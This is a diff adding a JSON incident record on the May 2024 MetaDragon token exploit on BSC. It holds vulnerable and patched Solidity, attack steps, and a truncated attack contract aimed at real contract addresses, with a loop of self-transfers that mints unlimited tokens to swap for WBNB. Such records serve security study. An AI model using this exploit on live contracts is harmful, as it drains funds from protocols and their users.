@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-05-XX_MetaDragon_TransferToContractUnrestrictedMint",
+ "source_file": "2024/2024-05-XX_MetaDragon_TransferToContractUnrestrictedMint.md",
+ "title": "MetaDragon — Unlimited Minting via `transfer()` to Contract Address Analysis",
+ "date": "2024-05-01",
+ "protocol": "MetaDragon",
+ "chain": "BSC",
+ "loss_raw": "~$180,000",
+ "loss_usd": 180000.0,
+ "root_cause": "In the `transfer(to, tokenId)` function, when `to == address(this) || to == erc721`, `transform(value)` is called, triggering unlimited minting. The attacker iterated token IDs 0–39 to mass-mint MetaTokens and swap them for WBNB",
+ "attack_tx": null,
+ "vulnerable_contract": "MetaToken 0xEF1f39d8",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: unlimited minting when transferring to contract address\ncontract MetaToken {\n    address public erc721;\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        if (to == address(this) || to == erc721) {\n            // Unlimited minting trigger — no access control\n            transform(value);\n        } else {\n            _transfer(msg.sender, to, value);\n        }\n        return true;\n    }\n\n    function transform(uint256 tokenId) internal {\n        // Mint MetaToken based on tokenId\n        _mint(msg.sender, mintAmount);  // ← Anyone can trigger\n    }\n}\n\n//",
+  "// File: MetaDragon_decompiled.sol\ncontract MetaDragon {\n    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: access control on transform\nfunction transfer(address to, uint256 value) external returns (bool) {\n    if (to == address(this) || to == erc721) {\n        // Only owner can trigger transform\n        require(msg.sender == owner || approvedTransformers[msg.sender], \"not authorized\");\n        transform(value);\n    } else {\n        _transfer(msg.sender, to, value);\n    }\n    return true;\n}"
+ ],
+ "steps": [
+  "→ [1] for (tokenId = 0; tokenId < 40; tokenId++)",
+  "→ [2] MetaToken.transfer(address(MetaToken), tokenId)",
+  "transform(tokenId) called → MetaToken minted",
+  "→ [3] Large MetaToken balance accumulated over 40 iterations",
+  "→ [4] MetaToken.approve(router, maxAmount)",
+  "→ [5] MetaToken → WBNB swap (Uniswap V2)",
+  "→ [6] ~$180K worth of WBNB drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] for (tokenId = 0; tokenId < 40; tokenId++)\n  │\n  ├─→ [2] MetaToken.transfer(address(MetaToken), tokenId)\n  │         └─ to == address(this) condition satisfied\n  │         └─ transform(tokenId) called → MetaToken minted\n  │\n  ├─→ [3] Large MetaToken balance accumulated over 40 iterations\n  │\n  ├─→ [4] MetaToken.approve(router, maxAmount)\n  │\n  ├─→ [5] MetaToken → WBNB swap (Uniswap V2)\n  │\n  └─→ [6] ~$180K worth of WBNB drained",
+  "interface IUniswapV2Router {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn, uint256 amountOutMin,\n        address[] calldata path, address to, uint256 deadline\n    ) external;\n}\n\ncontract AttackContract {\n    IERC20  constant meta   = IERC20(0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f);\n    IERC20  constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IUniswapV2Router constant router = IUniswapV2Router(/* PancakeSwap Router */);\n\n    function testExploit() external {\n        // [1] Iterate token IDs 0-39 to trigger minting\n        for (uint256 tokenId = 0; tokenId < 40; tokenId++) {\n            // transfer(address(meta), tokenId) → calls transform(tokenId)\n            meta.transfer(address(meta), tokenId);\n        }\n\n       "
+ ]
+}
